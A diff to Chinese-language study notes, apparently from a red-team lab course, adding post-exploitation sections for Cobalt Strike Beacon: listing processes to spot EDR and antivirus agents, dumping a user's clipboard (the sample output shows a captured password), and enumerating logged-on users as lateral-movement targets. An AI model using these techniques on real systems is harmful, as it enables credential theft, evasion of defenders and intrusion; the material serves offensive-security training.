@@ -4,6 +4,12 @@
 
 > 在我们执行任何post-exploitation步骤之前，谨慎的做法是评估当前情况。我们执行的每项操作都存在一定的检测风险。这种风险的程度取决于我们的能力和任何防御者的能力。我们可以枚举主机以了解它受到保护和监控的程度。这可以包括防病毒 (AV) 或端点检测和响应 (EDR) 软件、Windows 审核策略、PowerShell 日志记录、事件转发等。
 
+# Processes
+
+使用```ps```命令列出系统上正在运行的进程
+
+有几个有趣的过程，包括```Sysmon64、MsMpEng、elastic-endpoint和elastic-agent```。当以中等完整性(medium integrity)（即标准用户）运行时，您将无法查看当前用户不拥有的进程的架构、会话和用户信息
+
 # Seatbelt
 
 [Seatbelt](https://github.com/GhostPack/Seatbelt)是一个c#编写的用于主机探测的工具
@@ -127,4 +133,32 @@ beacon> jobs
  1    0     keystroke logger
 
 beacon> jobkill 1
+```
+
+# Clipboard
+
+```clipboard```命令将捕获用户剪贴板中的任何文本（它不会捕获图像或任何其他类型的数据）
+
+这是一次性命令（它不作为作业运行）并将内容直接转储到 Beacon 控制台
+
+```
+beacon> clipboard
+[*] Tasked beacon to get clipboard contents
+
+Clipboard Data (8 bytes):
+Sup3rman
+```
+
+# User Sessions
+
+当前登录到同一台机器的用户可能是很好的攻击目标。如果他们比我们当前在域中的用户更有特权，他们可能是横向移动到其他机器的好选择
+
+```
+beacon> net logons
+
+Logged on users at \\localhost:
+
+DEV\bfarmer
+DEV\jking
+DEV\WKSTN-2$
 ```
